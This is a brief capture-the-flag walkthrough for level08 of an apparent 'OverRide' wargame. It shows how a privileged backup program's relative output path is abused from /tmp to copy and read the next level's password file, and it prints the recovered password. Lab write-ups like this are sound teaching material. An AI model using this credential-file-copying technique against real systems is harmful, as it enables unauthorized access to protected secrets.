# File argument exploit

Test programme

```bash
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```

The programme take argument

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

let's try in `/tmp`

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups//home/users/level09/
level08@OverRide:/tmp$ ~/level08 ~level09/.pass
level08@OverRide:/tmp$ cat backups/
home/ .log  
level08@OverRide:/tmp$ cat backups/.log 
LOG: Starting back up: /home/users/level09/.pass
LOG: Finished back up /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/
home/ .log  
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
